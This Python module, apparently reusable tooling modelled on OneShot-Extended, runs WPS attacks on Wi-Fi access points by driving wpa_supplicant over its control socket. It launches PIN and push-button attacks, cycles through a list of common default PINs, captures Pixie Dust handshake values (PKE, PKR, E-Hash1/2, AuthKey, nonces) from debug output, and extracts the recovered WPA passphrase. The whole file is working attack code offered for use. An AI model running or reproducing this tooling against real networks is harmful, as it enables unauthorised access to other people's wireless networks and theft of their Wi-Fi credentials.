#!/usr/bin/env python3
"""
WPS Engine - Direct wpa_supplicant controller
Replicates OneShot-Extended's wpa_supplicant usage:
  - Starts own wpa_supplicant instance
  - Communicates via Unix socket
  - Sends WPS_REG / WPS_PBC directly
  - Captures Pixie Dust data (PKE, PKR, E_HASH1/2, AUTHKEY, E_NONCE, R_NONCE)
  - Monitors WPS handshake messages (M1-M8)
  - Detects lock status (M2D, NACK)
"""

import os
import re
import sys
import time
import socket
import tempfile
import subprocess
from pathlib import Path


class WpsEngine:
    """
    Direct wpa_supplicant controller for WPS attacks.
    Like OneShot-Extended's connection.py but as reusable module.
    """

    def __init__(self, interface):
        self.interface = interface
        self.wpas_process = None
        self.temp_dir = None
        self.temp_conf = None
        self.ctrl_path = None
        self.sock = None

        # Pixie Dust data
        self.pixie_data = {
            'PKE': '', 'PKR': '', 'E_NONCE': '', 'R_NONCE': '',
            'AUTHKEY': '', 'E_HASH1': '', 'E_HASH2': '', 'BSSID': '',
        }

        # Connection state
        self.state = {
            'status': '',
            'last_m': 0,
            'essid': '',
            'bssid': '',
            'wpa_psk': '',
            'is_locked': False,
            'pin': '',
        }

        self.output_lines = []
        self.callback = None

    # ═══════════════════════════════════════════
    # WPA_SUPPLICANT PROCESS MANAGEMENT
    # ═══════════════════════════════════════════

    def start(self):
        """Start own wpa_supplicant instance (like ose.py)"""
        # Create temp directory for control socket
        self.temp_dir = tempfile.mkdtemp(prefix='wps_engine_')

        # Create config file
        self.temp_conf = os.path.join(self.temp_dir, 'wpa.conf')
        with open(self.temp_conf, 'w') as f:
            f.write(f'ctrl_interface={self.temp_dir}\n')
            f.write('ctrl_interface_group=root\n')
            f.write('update_config=1\n')

        self.ctrl_path = os.path.join(self.temp_dir, self.interface)

        # Start wpa_supplicant
        cmd = [
            'wpa_supplicant',
            '-K',     # Do not clear keys on exit
            '-d',     # Verbose debug output
            '-Dnl80211,wext,hostapd,wired',
            f'-i{self.interface}',
            f'-c{self.temp_conf}',
        ]

        try:
            self.wpas_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
        except FileNotFoundError:
            return False, 'wpa_supplicant not found'
        except Exception as e:
            return False, str(e)

        # Wait for control interface
        for _ in range(50):
            if os.path.exists(self.ctrl_path):
                break
            # Check if process died
            if self.wpas_process.poll() is not None:
                output = self.wpas_process.communicate()[0]
                return False, f'wpa_supplicant failed: {output[:200]}'
            time.sleep(0.1)
        else:
            return False, 'Control interface timeout'

        # Create socket
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        sock_file = tempfile.mktemp(dir=self.temp_dir)
        self.sock.bind(sock_file)

        return True, 'wpa_supplicant started'

    def stop(self):
        """Stop wpa_supplicant and cleanup"""
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass

        if self.wpas_process:
            try:
                self._send('TERMINATE')
                self.wpas_process.wait(timeout=3)
            except Exception:
                try:
                    self.wpas_process.terminate()
                    self.wpas_process.wait(timeout=2)
                except Exception:
                    try:
                        self.wpas_process.kill()
                    except Exception:
                        pass

        # Cleanup temp files
        if self.temp_dir and os.path.exists(self.temp_dir):
            import shutil
            shutil.rmtree(self.temp_dir, ignore_errors=True)

        self.wpas_process = None
        self.sock = None

    def is_alive(self):
        """Check if wpa_supplicant is still running"""
        if self.wpas_process:
            return self.wpas_process.poll() is None
        return False

    # ═══════════════════════════════════════════
    # SOCKET COMMUNICATION
    # ═══════════════════════════════════════════

    def _send(self, command):
        """Send command via Unix socket"""
        if self.sock and self.ctrl_path:
            self.sock.sendto(command.encode(), self.ctrl_path)

    def _send_recv(self, command):
        """Send command and receive reply"""
        self._send(command)
        try:
            data, _ = self.sock.recvfrom(4096)
            return data.decode('utf-8', errors='replace')
        except Exception:
            return ''

    # ═══════════════════════════════════════════
    # OUTPUT PARSING (like ose.py connection.py)
    # ═══════════════════════════════════════════

    def _read_line(self):
        """Read one line from wpa_supplicant output"""
        if self.wpas_process and self.wpas_process.stdout:
            return self.wpas_process.stdout.readline().rstrip('\n')
        return ''

    def _get_hex(self, line):
        """Extract hex data from wpa_supplicant debug output"""
        parts = line.split(':', 3)
        if len(parts) >= 3:
            return parts[2].replace(' ', '').upper()
        return ''

    def _handle_wps_message(self, line):
        """Parse WPS protocol messages"""

        # M2D (AP rejecting PINs)
        if 'M2D' in line:
            self._log('Received WPS Message M2D')
            self.state['status'] = 'WPS_FAIL'
            self.state['is_locked'] = True
            self._log('AP is not accepting PINs (LOCKED)')
            return False

        # Building message
        m = re.search(r'Building Message M(\d+)', line)
        if m:
            n = int(m.group(1))
            self.state['last_m'] = n
            self._log(f'Sending WPS Message M{n}')
            return True

        # Received message
        m = re.search(r'Received M(\d+)', line)
        if m:
            n = int(m.group(1))
            self.state['last_m'] = n
            self._log(f'Received WPS Message M{n}')
            if n == 5:
                self._log('First half of PIN is VALID!')
            return True

        # NACK
        if 'Received WSC_NACK' in line:
            self.state['status'] = 'WSC_NACK'
            self._log('Received WSC NACK')
            if self.state['last_m'] < 3:
                self.state['is_locked'] = True
                return False
            self._log('Wrong PIN code')
            return True

        # ═══ Pixie Dust Data Capture ═══
        if 'Enrollee Nonce' in line and 'hexdump' in line:
            self._capture_pixie('E_NONCE', line, 16 * 2)
        elif 'Registrar Nonce' in line and 'hexdump' in line:
            self._capture_pixie('R_NONCE', line, 16 * 2)
        elif 'DH own Public Key' in line and 'hexdump' in line:
            self._capture_pixie('PKR', line, 192 * 2)
        elif 'DH peer Public Key' in line and 'hexdump' in line:
            self._capture_pixie('PKE', line, 192 * 2)
        elif 'AuthKey' in line and 'hexdump' in line:
            self._capture_pixie('AUTHKEY', line, 32 * 2)
        elif 'E-Hash1' in line and 'hexdump' in line:
            self._capture_pixie('E_HASH1', line, 32 * 2)
        elif 'E-Hash2' in line and 'hexdump' in line:
            self._capture_pixie('E_HASH2', line, 32 * 2)

        # Network Key (SUCCESS!)
        if 'Network Key' in line and 'hexdump' in line:
            self.state['status'] = 'GOT_PSK'
            hex_val = self._get_hex(line)
            try:
                self.state['wpa_psk'] = bytes.fromhex(hex_val).decode('utf-8', errors='replace')
            except Exception:
                self.state['wpa_psk'] = hex_val
            self._log(f'PSK FOUND: {self.state["wpa_psk"]}')

        return True

    def _capture_pixie(self, attr, line, expected_len):
        """Capture Pixie Dust data from hexdump line"""
        hex_val = self._get_hex(line)

        # Be lenient with length
        if len(hex_val) != expected_len:
            if len(hex_val) > expected_len:
                hex_val = hex_val[:expected_len]
            elif len(hex_val) > 0:
                hex_val = hex_val.zfill(expected_len)
            else:
                return

        self.pixie_data[attr] = hex_val
        self._log(f'{attr}: {hex_val}')

    def _handle_connection_state(self, line, pbc_mode=False):
        """Parse connection state changes"""

        if 'State:' in line and 'SCANNING' in line:
            self.state['status'] = 'scanning'
            self._log('Scanning...')

        elif 'WPS-FAIL' in line and self.state['status']:
            self.state['status'] = 'WPS_FAIL'
            self._log('WPS-FAIL')

        elif 'Trying to authenticate' in line:
            self.state['status'] = 'authenticating'
            if 'SSID' in line:
                self.state['essid'] = self._extract_ssid(line)
            self._log('Authenticating...')

        elif 'Authentication response' in line:
            self._log('Authenticated')

        elif 'Trying to associate' in line:
            self.state['status'] = 'associating'
            if 'SSID' in line:
                self.state['essid'] = self._extract_ssid(line)
            self._log('Associating...')

        elif 'Associated with' in line and self.interface in line:
            bssid = line.split()[-1].upper()
            self._log(f'Associated with {bssid}')

        elif 'EAPOL: txStart' in line:
            self.state['status'] = 'eapol_start'
            self._log('Sending EAPOL Start...')

        elif 'Identity Request' in line:
            self._log('Received Identity Request')

        elif 'using real identity' in line:
            self._log('Sending Identity Response...')

        elif 'WPS-TIMEOUT' in line:
            self.state['status'] = 'WPS_TIMEOUT'

        elif pbc_mode and 'selected BSS' in line:
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.state['bssid'] = bssid
            self._log(f'Selected AP: {bssid}')

        return True

    def _extract_ssid(self, line):
        """Extract SSID from wpa_supplicant line"""
        try:
            parts = line.split("'")
            if len(parts) >= 3:
                return parts[1]
        except Exception:
            pass
        return ''

    def _log(self, message):
        """Log message and call callback"""
        self.output_lines.append(message)
        if self.callback:
            self.callback(message)

    def _process_line(self, line, pbc_mode=False):
        """Process one line of wpa_supplicant output"""
        if not line:
            return True

        # WPS messages
        if line.startswith('WPS: '):
            return self._handle_wps_message(line)

        # Connection states
        return self._handle_connection_state(line, pbc_mode)

    # ═══════════════════════════════════════════
    # WPS OPERATIONS
    # ═══════════════════════════════════════════

    def wps_pin_attack(self, bssid, pin, timeout=60):
        """
        Perform WPS PIN attack.
        Like ose.py's singleConnection()
        """
        # Reset state
        self.pixie_data = {k: '' for k in self.pixie_data}
        self.state = {
            'status': '', 'last_m': 0, 'essid': '',
            'bssid': bssid.upper(), 'wpa_psk': '',
            'is_locked': False, 'pin': pin,
        }
        self.output_lines = []

        self.pixie_data['BSSID'] = bssid.upper()

        # Start WPS PIN session
        cmd = f'WPS_REG {bssid} {pin}'
        reply = self._send_recv(cmd)

        if 'OK' not in reply:
            self.state['status'] = 'WPS_FAIL'
            self._log(f'WPS_REG failed: {reply}')
            return self._result()

        self._log(f'Trying PIN: {pin}')

        # Monitor output
        start_time = time.time()
        while time.time() - start_time < timeout:
            if not self.is_alive():
                break

            line = self._read_line()
            if not line:
                continue

            if not self._process_line(line):
                break

            # Check terminal states
            if self.state['status'] in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break

        # Cancel WPS
        self._send('WPS_CANCEL')

        return self._result()

    def wps_pbc_attack(self, bssid=None, timeout=120):
        """
        Perform WPS PBC (Push Button) attack.
        Like ose.py's pbc mode.
        """
        self.pixie_data = {k: '' for k in self.pixie_data}
        self.state = {
            'status': '', 'last_m': 0, 'essid': '',
            'bssid': bssid.upper() if bssid else '',
            'wpa_psk': '', 'is_locked': False, 'pin': 'PBC',
        }
        self.output_lines = []

        if bssid:
            cmd = f'WPS_PBC {bssid}'
        else:
            cmd = 'WPS_PBC'

        reply = self._send_recv(cmd)
        if 'OK' not in reply:
            self.state['status'] = 'WPS_FAIL'
            self._log(f'WPS_PBC failed: {reply}')
            return self._result()

        self._log('WPS PBC started...')

        start_time = time.time()
        while time.time() - start_time < timeout:
            if not self.is_alive():
                break
            line = self._read_line()
            if not line:
                continue
            if not self._process_line(line, pbc_mode=True):
                break
            if self.state['status'] in ('GOT_PSK', 'WPS_FAIL'):
                break

        self._send('WPS_CANCEL')
        return self._result()

    def collect_pixie_data(self, bssid, pins=None, max_attempts=10):
        """
        Collect Pixie Dust data by trying multiple PINs.
        Like ose.py's enhanced multi-PIN collection.
        """
        if pins is None:
            pins = [
                '12345670', '00000000', '88888888', '11111111',
                '99999999', '12345678', '11223344', '00000001',
            ]

        # Try each PIN to collect data
        for i, pin in enumerate(pins[:max_attempts]):
            if self.pixie_data.get('PKE') and self.pixie_data.get('E_HASH1'):
                # Already have enough data
                break

            self._log(f'Collecting data with PIN: {pin} ({i+1}/{max_attempts})')

            # Store old data
            old_data = self.pixie_data.copy()

            result = self.wps_pin_attack(bssid, pin, timeout=30)

            # Merge data (keep old if new didn't get it)
            for key in self.pixie_data:
                if not self.pixie_data[key] and old_data[key]:
                    self.pixie_data[key] = old_data[key]

            if self.state['status'] == 'GOT_PSK':
                return result

        # Check what we collected
        collected = [k for k, v in self.pixie_data.items()
                    if v and k != 'BSSID']

        self._log(f'Collected: {", ".join(collected)} ({len(collected)}/8)')

        return {
            'pin': None,
            'psk': None,
            'status': 'data_collected',
            'pixie_data': self.pixie_data.copy(),
            'collected_count': len(collected),
            'output': '\n'.join(self.output_lines),
        }

    def _result(self):
        """Build result dict"""
        return {
            'pin': self.state.get('pin'),
            'psk': self.state.get('wpa_psk'),
            'status': self._map_status(),
            'pixie_data': self.pixie_data.copy(),
            'essid': self.state.get('essid'),
            'is_locked': self.state.get('is_locked'),
            'last_m': self.state.get('last_m'),
            'output': '\n'.join(self.output_lines),
        }

    def _map_status(self):
        """Map internal status to result status"""
        s = self.state['status']
        if s == 'GOT_PSK':
            return 'success'
        elif s == 'WSC_NACK':
            return 'wrong_pin'
        elif s == 'WPS_FAIL':
            return 'failed'
        elif s == 'WPS_TIMEOUT':
            return 'timeout'
        elif self.state.get('is_locked'):
            return 'locked'
        return 'completed'

    # ═══════════════════════════════════════════
    # SCAN VIA WPA_SUPPLICANT (like ose.py scanner)
    # ═══════════════════════════════════════════

    def scan(self):
        """Trigger scan via wpa_supplicant"""
        reply = self._send_recv('SCAN')
        return 'OK' in reply

    def get_scan_results(self):
        """Get scan results from wpa_supplicant"""
        reply = self._send_recv('SCAN_RESULTS')
        networks = []

        for line in reply.split('\n'):
            if line.startswith('bssid') or not line.strip():
                continue
            parts = line.split('\t')
            if len(parts) < 5:
                continue

            bssid = parts[0].strip().upper()
            if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', bssid):
                continue

            freq = parts[1].strip()
            signal = parts[2].strip()
            flags = parts[3].strip()
            ssid = parts[4].strip() if len(parts) > 4 else ''

            enc = 'Open'
            has_wps = 0
            if '[WPA-PSK' in flags: enc = 'WPA'
            if '[WPA2-PSK' in flags: enc = 'WPA2'
            if '[WPS]' in flags: has_wps = 1

            ch = 0
            try:
                f = int(freq)
                if 2412 <= f <= 2484:
                    ch = 14 if f == 2484 else (f - 2412) // 5 + 1
                elif 5170 <= f <= 5825:
                    ch = (f - 5170) // 5 + 34
            except (ValueError, TypeError):
                pass

            networks.append({
                'bssid': bssid,
                'essid': ssid or 'Hidden',
                'channel': ch,
                'frequency': int(freq) if freq.isdigit() else 0,
                'rssi': int(signal) if signal.lstrip('-').isdigit() else 0,
                'has_wps': has_wps,
                'wps_locked': 'Unknown',
                'wps_version': '',
                'wps_device': '',
                'wps_model': '',
                'encryption': enc,
                'cipher': '',
                'auth': '',
                'source': 'wpa_engine',
            })

        networks.sort(key=lambda x: x['rssi'], reverse=True)
        return networks

    # ═══════════════════════════════════════════
    # NETWORK MANAGEMENT
    # ═══════════════════════════════════════════

    def add_network(self, ssid, psk=None):
        """Add network via socket"""
        reply = self._send_recv('ADD_NETWORK')
        net_id = reply.strip()
        if not net_id.isdigit():
            return None

        self._send_recv(f'SET_NETWORK {net_id} ssid "{ssid}"')
        if psk:
            self._send_recv(f'SET_NETWORK {net_id} psk "{psk}"')
            self._send_recv(f'SET_NETWORK {net_id} key_mgmt WPA-PSK')
        else:
            self._send_recv(f'SET_NETWORK {net_id} key_mgmt NONE')

        self._send_recv(f'SELECT_NETWORK {net_id}')
        self._send_recv(f'ENABLE_NETWORK {net_id}')
        self._send_recv('SAVE_CONFIG')

        return int(net_id)

    def get_status(self):
        """Get connection status via socket"""
        reply = self._send_recv('STATUS')
        info = {}
        for line in reply.split('\n'):
            if '=' in line:
                k, v = line.split('=', 1)
                info[k.strip()] = v.strip()
        return info

    def disconnect(self):
        self._send_recv('DISCONNECT')

    def reconnect(self):
        self._send_recv('RECONNECT')

    def list_networks(self):
        """List saved networks via socket"""
        reply = self._send_recv('LIST_NETWORKS')
        networks = []
        for line in reply.split('\n')[1:]:
            parts = line.split('\t')
            if len(parts) >= 2:
                networks.append({
                    'id': parts[0],
                    'ssid': parts[1],
                    'bssid': parts[2] if len(parts) > 2 else 'any',
                })
        return networks
